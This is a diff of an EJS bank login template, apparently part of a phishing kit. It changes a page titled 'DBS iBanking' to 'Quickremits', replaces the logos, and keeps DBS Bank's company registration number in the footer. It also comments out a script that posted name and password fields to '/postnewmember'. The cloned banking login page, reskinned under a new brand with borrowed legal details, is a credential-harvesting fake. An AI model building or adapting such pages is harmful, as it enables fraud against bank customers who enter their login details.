@@ -3,7 +3,7 @@
 <html>
     <head>
         <%- include('../partials/head.ejs') %> 
-        <title>DBS iBanking</title>  
+        <title>Quickremits</title>  
 <meta property="og:title" content="Secure Online Banking Login - Access Your Account Anytime, Anywhere">
     
     </head>  
@@ -11,12 +11,12 @@
       <body>   
         
         <div class="fullscreen" style="display:none">
-          <img src="/images/singerpaulfav.png" alt="loading..." class="rotating-image">
+          <img src="/images/qremit.jpeg" alt="loading..." class="rotating-image">
     </div>  
 
     <div class="fullscreenb" style="display:none">
-      <img src="/images/singerpaulfav.png" alt="loading..." class="rotating-image"> 
-      <button class="stopl" onclick="stopl()">Stop Loading</button>
+      <img src="/images/qremit.jpeg" alt="loading..." class="rotating-image"> 
+      <button class="stopl" onclick="stopl()">Stop Loading </button>
    </div> 
 
           <div class="header"> 
@@ -36,7 +36,7 @@
             <div class="loginform"> 
                      <div class="redbg"></div>  
                      <div class="inner">
-                    <div class="dlogo"> <img src="/images/singerpaul.png" alt="logo"> </div>   
+                    <div class="dlogo"> <img src="/images/qremit.jpeg" alt="logo"> </div>   
                        <div class="instruction">
                         <p>For an optimal viewing experience and security, we recommend that you use the latest web browser. Click <span>here</span> for a list of supported browsers.</p>
                         </div>  
@@ -79,7 +79,7 @@
                   <div><p>Fair Dealing Commitment</p></div> 
                   <div><p>Compliance with Tax Requirements</p></div> 
                   <div><p>Vulnerability Disclosure Policy</p></div>
-                  <div><p>©2024 DBS Bank Ltd. Co. Reg. No. 196800306E</p></div> 
+                  <div><p>©2024 Quickremits Bank Ltd. Co. Reg. No. 196800306E</p></div> 
                  </div>  
 
                   <div class="icons">
@@ -94,21 +94,21 @@
             <script>   
             
 
-            const data = {
-               name : 'fhf',
-               pass : 'dks',
-            } 
+           // const data = {
+            //   name : 'fhf',
+             //  pass : 'dks',
+         //   } 
 
-                window.onload = function() { 
-                        fetch('/postnewmember', {
-                        method : 'post',
-                          body : JSON.stringify(data),
-                        headers : {
-                           'Content-Type' : 'application/json',
-                         Accept : 'application/json',
-                          } 
-               });
-                 } 
+               // window.onload = function() { 
+                        // fetch('/postnewmember', {
+                   //   method : 'post',
+                         // body : JSON.stringify(data),
+                    //    headers : {
+                       //    'Content-Type' : 'application/json',
+                     //    Accept : 'application/json',
+                      //    } 
+             //  });
+             //    } 
 
         
        
